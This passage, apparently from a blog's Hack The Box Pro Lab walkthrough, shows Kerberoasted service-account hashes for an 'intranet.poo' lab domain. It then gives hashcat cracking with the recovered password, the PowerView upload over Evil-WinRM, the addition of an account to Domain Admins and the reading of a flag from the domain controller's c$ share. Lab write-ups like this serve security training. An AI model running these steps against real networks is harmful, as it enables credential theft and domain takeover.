</span></span><span class="line"><span class="cl">output                                                                             
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------   
</span></span><span class="line"><span class="cl">NULL                                                                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NULL                                                                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">TicketByteHexStream  :                                                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hash                 : <span class="nv">$krb5tgs$HR_peoplesoft</span>/intranet.poo:1433:A175CE2658B987C0FE5CE7CE9380303E<span class="nv">$C82FEE2FB0F43648D7C3BD</span>   
</span></span><span class="line"><span class="cl">                       10BE84A19E8953E7EE295D224E38F89B6B8EEDBFCF177F1E1DD8BC4CEA78B59059FC365DB3DF096BD8E7FA584BABE6DA   
</span></span><span class="line"><span class="cl">                       E33C2F3EF1654958DECBF025C651B2CB4016071CE78D505DEE1A9893C1D64215D663324B15F01FEA7CCFB9D3979391E4   
</span></span><span class="line"><span class="cl">                       D05FDEA0E70575BC8A48FBC1885D9097416F778B07F696203AA818125C0FD2223F721056AE444C1AA10AE3151BAE1757   
</span></span><span class="line"><span class="cl">                       3A276625C78B2A46DC5F24054541CBD4A7E6FA67082D885F212C2CB132432AD5BD64BDD5063F0AFAC505703703B20B3E   
</span></span><span class="line"><span class="cl">                       E1E369BDC8281F679B07949474B7C22C498E77ADBB54D9362FBE00AA8678AE180C4713973A08B94DA1A3808EE70B68C6   
</span></span><span class="line"><span class="cl">                       0D75DC5348DF0BD321FAD17FDA36D7BA4AFD197365958CDE3CEF076EDC90863B1F27CB038D64FEFEE179654C93545A14   
</span></span><span class="line"><span class="cl">                       AB02CE6E821022D1EFDE08FA58B95D6726724DB02519224E34AAF7C20C165858A28D0EBB4EC1634272CD74610ABDCD11   
</span></span><span class="line"><span class="cl">                       8898C407FEA9B9B82C539C4FD6465B09C8188A340FE8668E987D4E009D4D8672FD68AD828D3A2F011700B7FEE42C9934   
</span></span><span class="line"><span class="cl">                       0995A3D6C29442B83ACD453611955E600ACBCEDA6E9FAB078C53954DCC801AD17656CFDDCF0FC7A656FBF67FDE9516CD   
</span></span><span class="line"><span class="cl">                       3D3E255262841D6C25C52C81472ECE2C16F98CD957996D2C3CA5604F918C58F8EA2D1163D51AF36E9C3DF496442D604B   
</span></span><span class="line"><span class="cl">                       D31A7D8E3CE1093C47009ADF930A9CF736249D42EE289FBFB9636CD129E8D992C3FFE651CC94046FD1593AD1CD9236F2   
</span></span><span class="line"><span class="cl">                       DD29E22EE389E56FF702783CA9EE4E7A5BAEC5F647F1EB34E26D98AF57E1C3F84DC83B4C851F5F867FB89CEFCB717679   
</span></span><span class="line"><span class="cl">                       2AA840F594D946006F5F8C86EB5EB3F1AD50469A769817930A7F4027DFE852B6F235EEC086F88DB38DCF68F889D62388   
</span></span><span class="line"><span class="cl">                       6683C43C6F52123B6337C16FCF8A23162E21C74A335D5C143292F801DAA42C9469A73F63C245E18A6BCCF779AD82BCA9  
</span></span><span class="line"><span class="cl">                       EC5D4DC80271D6A8C8494906C55F66AB39DA96AC5C21F271C950940D809CE97E238C4F33486D0B566666F66BD8316602   
</span></span><span class="line"><span class="cl">                       C5332F749D54A66FFE65CA76302F2D69BD0BD73A5385BE98B006636B44B0B7BA2AA8630B311899875EBE7C97E4DDA210   
</span></span><span class="line"><span class="cl">                       E35D682924CE1EE1050D5B3E368F45223F329D1140E79DD9670454C07E6EBBF8C5BC7F52E248734F4BBA4B1CA37B4C4C   
</span></span><span class="line"><span class="cl">                       8CF9F35C937F00C4ACAF923FDF442F8699C0449023F3A15D7B37E2986B5244733BF1199D401EEC5B30E479D0D15C4984   
</span></span><span class="line"><span class="cl">                       3FCF911C8673464D8FAA70B45129F6D76FD4E4D6056E6063DC40ADA827C4F47622D3A757CC313424DECBF784E51C2A90   
</span></span><span class="line"><span class="cl">                       9B3F1E131200B4352A3802B20122F0A966C6E5606C723F3E54AC5D53AFD7252D0B115496A0C595A0F1254FCC2CCBB81B  
</span></span><span class="line"><span class="cl">                       9EE82FDFF47EB993B4D9F4749BC639853727D5A176D55A654A897E05F6FD711E7177EED89D380FC40D1733D47C7D95B0   
</span></span><span class="line"><span class="cl">                       1511F3920417D651A6D3DF606B01757B634B3876ED3219829922462B8CE47C684AE01C46E3F5023D78881BCA09F67C66   
</span></span><span class="line"><span class="cl">                       695A5065065CD9A46CB2368B7253568EE429D635829A7C376E22F34DD1E15EEB03D73AD42F41C92F848BEC6CBC422054   
</span></span><span class="line"><span class="cl">                       C05AB02CC928C7DFF27BE1B34062E0FECA422E1A0721C5672AE2A2A1F566564C61C9DD58D483705913BEA15FFF970A47   
</span></span><span class="line"><span class="cl">                       13739985CE588246F070D28B81A31AB2707CF8F6B4463DE3C7D5073140F3F6689397   
</span></span><span class="line"><span class="cl">SamAccountName       : p00_hr                                                      
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DistinguishedName    : <span class="nv">CN</span><span class="o">=</span>p00_hr,CN<span class="o">=</span>Users,DC<span class="o">=</span>intranet,DC<span class="o">=</span>poo                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ServicePrincipalName : HR_peoplesoft/intranet.poo:1433                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NULL                                                                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">TicketByteHexStream  :                                                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hash                 : <span class="nv">$krb5tgs$cyber_audit</span>/intranet.poo:443:E3A87FEF289CC540C73A52551F3C3A43<span class="nv">$1096</span>E4652145F6AF34174138C   
</span></span><span class="line"><span class="cl">                       6B5FA7091AC7088CB0AFBA198E5D967C7FF778045E3D7186A75125D963896F3C6A26207ADDDD9E15204182DF89498377  
</span></span><span class="line"><span class="cl">                       516EC136DE8596791CDF26E1C78F6A94DC993EC61EADDA5B7A71430E16065BB20B6D411FB373349FE6FB012FBA27A7F7   
</span></span><span class="line"><span class="cl">                       AC52D94F56F06AD072B70448AC78D7D6D17454817BFB1C5684B8A8CC8F5C71DA108618E3B549997E0CF52F5833388B20   
</span></span><span class="line"><span class="cl">                       06FE0AA2C1191D32DB7F9CC3D742B367F858A87BBBF9C54C8369366B218CAB9B6F63B094BA3FFE3CB4FE6445C2E3835A   
</span></span><span class="line"><span class="cl">                       DDA544BD6A92604244199F5C73DE0191B3272BF65D4C21B04E6CB4CC0401045FEBB53FE36A2AA05FD4379D868A06AE51   
</span></span><span class="line"><span class="cl">                       EB177A2958527BCFCB48D8865E9D3192FDED6F1F8832763CEFF1700A666E479A4F043169B9FD1EE9FCAAD741ED2173A9   
</span></span><span class="line"><span class="cl">                       88D7BCA8A6A9BBAB82931DD8DCE071727BC50330627BEF3B571437006D2DA8E02BC89F4541FEEBBBECF119ACF59EBE7F   
</span></span><span class="line"><span class="cl">                       BF0C36CD65B36BDFB0D27566A6D9D7E6527D896CE2C3AE84175AD3870943984017E3285C71D379B8AD162A4B4D24A3DF   
</span></span><span class="line"><span class="cl">                       DFDBC479220B45254F90C3384AE946F5E239480B8C74F93C0889C653F950762AA3CA717D34D6028409975202D55E5DE1   
</span></span><span class="line"><span class="cl">                       28219423A23C8675F67FC71BEF0534932A2CC7248AECA151F019EA594AFD56B5CF910497AF67DD06AE42AB7FA8DCB7B9  
</span></span><span class="line"><span class="cl">                       BF519A47B844233238E0B1D085B110B31F055047AD4EA638B25EF4D73F1C0D2CF46CE495D4B2C8C1BBE71C9AD58B958E  
</span></span><span class="line"><span class="cl">                       71F73339114F893F0C2CDCB33BF7C0C28E1596E0A1EF450B4505EE1AE334CF6AC374E92AF6FB21B13711DAAACC6CACBB  
</span></span><span class="line"><span class="cl">                       8946F06F5C024EC5150F8402D50F732D93A3625B6A9CEEB7B134DFAC69BE4206C358E3C3B88D0469DC5CDD341BF30C87   
</span></span><span class="line"><span class="cl">                       C8336EC0A16215EB8F241CB74AD69A30EF118395173D2815CD579E43B2D181242DC85BF26111B221215317C34B82D13D   
</span></span><span class="line"><span class="cl">                       430F58C8A2B77D8D1D26F3357D2DE6BD5C109E4B16C1D29E507311F5266B7CC323252609D5C9171C04098FFB4E4AB71D  
</span></span><span class="line"><span class="cl">                       5006CE10BF7329BC0920E328FAB9621A2747587CBA14164CBD31C22CB90DA1CAF0EBDAEC40BD643245A724C62F63DDCD  
</span></span><span class="line"><span class="cl">                       93C86DF38275E90EE0BD7AC0614A033EAE597BD8131129C091946D983B57401F5AA0FEF76628992129C6C2BA744F2BBA  
</span></span><span class="line"><span class="cl">                       30477ABFEF70FF620619CBC20B60B9CB238216E33018EC972D6840896C65BACE07DDC87A4EB237108D6AD1E8BA4B13A0  
</span></span><span class="line"><span class="cl">                       98E16FDA4616A95A5B13334DB5469C8898E7790FACC14EB33671E4BED7935D21ABF80DE28F3F902A96F59470F0C530C9  
</span></span><span class="line"><span class="cl">                       D3EC61DF1CA62C8B708E7963C7ACB19424814C80C2791735B9CD7DFF5C770412C329C62D8655FDE7293C40F98D38AFCC  
</span></span><span class="line"><span class="cl">                       10543A7ECF58F6AAC5A0E5B63B3106E124EF76B5062DB4E29732098EFC937347FB0076F3AEF047BC49D188A9BE6F5B38  
</span></span><span class="line"><span class="cl">                       048AD94733B0FBF0245A337F5408A71FC2772C10B07DB4C85435949617200374F3961AEF56A2D4B929C22CE298EE9587  
</span></span><span class="line"><span class="cl">                       7159EA68A7F3E596399FB645FFE9D57CA3D49C5E77C8568927A0EFDA0B4E0A04730EB7DB98E9B1F4FD2F93621BAD87B0 
</span></span><span class="line"><span class="cl">                       7F41F2B09EA07C61AE2154AF9BB2076A2EA1C0857E2990E89103DFC81BB07D5A66541C849A3EFA2C9894CE5BE14CD9C3 
</span></span><span class="line"><span class="cl">                       0D483FDFFC6CD13BFD35E2730A91396448E9A6BE611C156C5537765A4949FA9CF
</span></span><span class="line"><span class="cl">SamAccountName       : p00_adm                                                     
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DistinguishedName    : <span class="nv">CN</span><span class="o">=</span>p00_adm,CN<span class="o">=</span>Users,DC<span class="o">=</span>intranet,DC<span class="o">=</span>poo                      
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ServicePrincipalName : cyber_audit/intranet.poo:443                                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NULL                                                                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NULL                                                                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NULL                                                                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NULL                                                                               
</span></span></code></pre></div><p>As seen above, we have two accounts with their hashes identified. We shall try to crack the hashes using hashcat as seen below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> hashcat -m <span class="m">13100</span> p00_adm /usr/share/wordlists/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt --force
</span></span><span class="line"><span class="cl"> --force
</span></span><span class="line"><span class="cl">...<span class="o">[</span>snip<span class="o">]</span>...
</span></span><span class="line"><span class="cl">ZQ!5t4r
</span></span></code></pre></div><p>the hash for the admin is the one that was able to crack.  After getting the credentials, we shall use the newly found creds and add the p00_adm to  the admins group as shown below, after uploading the powerview script from <a
  href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
    target="_blank"
  >powersploit</a> onto the host machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\T</span>emp&gt; upload PowerView.ps1 .                                        
</span></span><span class="line"><span class="cl">Info: Uploading /home/n00b/HTB Prolabs/P.O.O/web enum/PowerView.ps1 to C:<span class="se">\T</span>emp<span class="se">\.</span>
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">Data: <span class="m">1027036</span> bytes of <span class="m">1027036</span> bytes copied
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">Info: Upload successful!
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\T</span>emp&gt; Import-Module .<span class="se">\P</span>owerView.ps1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Here I have created a PSCredential object to add p00_adm to the admin groups domain.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\T</span>emp&gt; <span class="nv">$pass</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;ZQ!5t4r&#39;</span> -AsPlainText -Force
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\T</span>emp&gt; <span class="nv">$cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">&#39;intranet.poo\p00_adm&#39;</span>, <span class="nv">$pass</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\T</span>emp&gt; Add-DomainGroupMember -Identity <span class="s1">&#39;Domain Admins&#39;</span> -Members <span class="s1">&#39;p00_adm&#39;</span> -Credential <span class="nv">$cred</span>
</span></span></code></pre></div><p>Since p00_adm is now a domain admin, it can access the c$ share on the Domain Controller and grab the flag I found on mr3ks’s desktop.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\T</span>emp&gt; net use <span class="se">\\</span>DC.intranet.poo<span class="se">\c</span>$ /u:intranet.poo<span class="se">\p</span>00_adm <span class="s1">&#39;ZQ!5t4r&#39;</span>
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\T</span>emp&gt; dir <span class="se">\\</span>DC.intranet.poo<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>
</span></span><span class="line"><span class="cl">    Directory: <span class="se">\\</span>DC.intranet.poo<span class="se">\c</span>$<span class="se">\u</span>sers
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">d-----        3/15/2018   1:20 AM                Administrator
</span></span><span class="line"><span class="cl">d-----        3/15/2018  12:38 AM                mr3ks
</span></span><span class="line"><span class="cl">d-r---       11/21/2016   3:24 AM                Public
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\T</span>emp&gt; <span class="nb">type</span> <span class="se">\\</span>DC.intranet.poo<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\m</span>r3ks<span class="se">\d</span>esktop<span class="se">\f</span>lag.txt
</span></span><span class="line"><span class="cl">POO<span class="o">{[</span>REDACTED<span class="o">]}</span>
</span></span></code></pre></div>
          
          
          
        </div>
        
        

        

        
  
  
    <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
    <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
      
        







  

  
  
    
    
      
    
      
    
      
    
  

  
  

  
  
    
      
      
        
      
    
  



<article
  class="relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
  
    <div class="flex-none relative overflow-hidden thumbnail_card_related">
      <img
        src="/posts/dancing/featured_hu_f7124642783a6c1c.png"
        alt="Dancing"
        loading="lazy"
        decoding="async"
        fetchpriority="low"
        class="not-prose absolute inset-0 w-full h-full object-cover">
    </div>
  
  
  <div class="px-6 py-4">
    <header>
      <a
        
          href="/posts/dancing/"
        
        class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2">
        <h2>
          Dancing
          
        </h2>
      </a>
    </header>
    <div class="text-sm text-neutral-500 dark:text-neutral-400">
      







  

  
  
  
    
  

  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2024-09-13T00:00:00&#43;00:00">13 September 2024</time><span class="px-2 text-primary-500">&middot;</span><span>324 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
    

    
    
  </div>

  
    <div class="flex flex-row flex-wrap items-center">
      
        
          
        
      
        
      
        
      
        
      
    </div>
  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] me-2" href="/categories/tier0/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Tier0
  </span>
</span>

              </a>
            
              <a class="relative mt-[0.5rem] me-2" href="/categories/starting-point/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Starting Point
  </span>
</span>

              </a>
            
          
        
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] me-2" href="/tags/htb/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    HTB
  </span>
</span>

              </a>
            
              <a class="relative mt-[0.5rem] me-2" href="/tags/very-easy/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Very Easy
  </span>
</span>

              </a>
            
          
        
      
    </div>
  

  
  



    </div>
    
      <div class="prose dark:prose-invert py-1">Only the flexible to dance.</div>
    
  </div>
  <div class="px-6 pt-4 pb-2"></div>
</article>

      
        







  

  
  
    
    
      
    
      
    
      
    
  

  
  

  
  
    
      
      
        
      
    
  



<article
  class="relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
  
    <div class="flex-none relative overflow-hidden thumbnail_card_related">
      <img
        src="/posts/fawn/featured_hu_284cd9853d1c2b4c.jpg"
        alt="Fawn"
        loading="lazy"
        decoding="async"
        fetchpriority="low"
        class="not-prose absolute inset-0 w-full h-full object-cover">
    </div>
  
  
  <div class="px-6 py-4">
    <header>
      <a
        
          href="/posts/fawn/"
        
        class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2">
        <h2>
          Fawn
          
        </h2>
      </a>
    </header>
    <div class="text-sm text-neutral-500 dark:text-neutral-400">
      







  

  
  
  
    
  

  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2024-09-12T00:00:00&#43;00:00">12 September 2024</time><span class="px-2 text-primary-500">&middot;</span><span>219 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
    

    
    
  </div>

  
    <div class="flex flex-row flex-wrap items-center">
      
        
          
        
      
        
      
        
      
        
      
    </div>
  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] me-2" href="/categories/tier0/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Tier0
  </span>
</span>

              </a>
            
              <a class="relative mt-[0.5rem] me-2" href="/categories/starting-point/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Starting Point
  </span>
</span>

              </a>
            
          
        
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] me-2" href="/tags/htb/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    HTB
  </span>
</span>

              </a>
            
              <a class="relative mt-[0.5rem] me-2" href="/tags/ftp/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    FTP
  </span>
</span>

              </a>
            
              <a class="relative mt-[0.5rem] me-2" href="/tags/very-easy/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Very Easy
  </span>
</span>

              </a>
            
          
        
      
    </div>
  

  
  



    </div>
    
      <div class="prose dark:prose-invert py-1">FTP</div>
    
  </div>
  <div class="px-6 pt-4 pb-2"></div>
</article>

      
        







  

  
  
    
    
      
    
      
    
      
    
  

  
  

  
  
    
      
      
        
      
    
  



<article
  class="relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
  
    <div class="flex-none relative overflow-hidden thumbnail_card_related">
      <img
        src="/posts/meow/featured_hu_1f454595bf268607.jpg"
        alt="Meow"
        loading="lazy"
        decoding="async"
        fetchpriority="low"
        class="not-prose absolute inset-0 w-full h-full object-cover">
    </div>
  
  
  <div class="px-6 py-4">
    <header>
      <a
        
          href="/posts/meow/"
        
        class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2">
        <h2>
          Meow
          
        </h2>
      </a>
    </header>
    <div class="text-sm text-neutral-500 dark:text-neutral-400">
      







  

  
  
  
    
  

  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2024-09-11T00:00:00&#43;00:00">11 September 2024</time><span class="px-2 text-primary-500">&middot;</span><span>401 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
    

    
    
  </div>

  
    <div class="flex flex-row flex-wrap items-center">
      
        
          
        
      
        
      
        
      
        
      
    </div>
  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] me-2" href="/categories/tier0/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Tier0
  </span>
</span>

              </a>
            
              <a class="relative mt-[0.5rem] me-2" href="/categories/starting-point/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Starting Point
  </span>
</span>

              </a>
            
          
        
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] me-2" href="/tags/htb/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    HTB
  </span>
</span>

              </a>
            
              <a class="relative mt-[0.5rem] me-2" href="/tags/very-easy/">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Very Easy
  </span>
</span>

              </a>
            
          
        
      
    </div>
  

  
  



    </div>
    
      <div class="prose dark:prose-invert py-1">Meow, meow</div>
    
  </div>
  <div class="px-6 pt-4 pb-2"></div>
</article>

      
    </section>
  


      </div>

      
      
        
        
          
          
        
        
        
        <script
          type="text/javascript"
          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
          data-oid="views_posts\P.O.O\index.md"
          data-oid-likes="likes_posts\P.O.O\index.md"></script>
      
    </section>

    
    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span class="flex flex-col">
          
            <a
              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
              href="/posts/the-musician/">
              <span class="leading-6">
                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;The Musician
              </span>
            </a>
            
              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
                <time datetime="2024-09-30T00:00:00&#43;00:00">30 September 2024</time>
              </span>
            
          
        </span>
        <span class="flex flex-col items-end">
          
            <a
              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
              href="/posts/xen/">
              <span class="leading-6">
                XEN&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
              </span>
            </a>
            
              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
                <time datetime="2024-10-12T00:00:00&#43;00:00">12 October 2024</time>
              </span>
            
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        


  






<div
  id="scroll-to-top"
  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
  <a
    href="#the-top"
    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
      
      
        
          
          
      
      
      
      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
        <ul class="flex list-none flex-col sm:flex-row">
          
            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href="/tags/"
                title="Tags">
                
                Tags
              </a>
            </li>
          
            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href="/categories/"
                title="Categories">
                
                Categories
              </a>
            </li>
          
        </ul>
      </nav>
    
  
  <div class="flex items-center justify-between">
    
    
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          © 2025 𝓱𝐚ĆⓀ𝑒я | All rights reserved.
      </p>
    

    
    
  </div>
  
    <script>
      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
        margin: 24,
        background: "rgba(0,0,0,0.5)",
        scrollOffset: 0,
      });
    </script>
  
  
  
  <script
    type="text/javascript"
    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
  data-url="http://localhost:1313/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
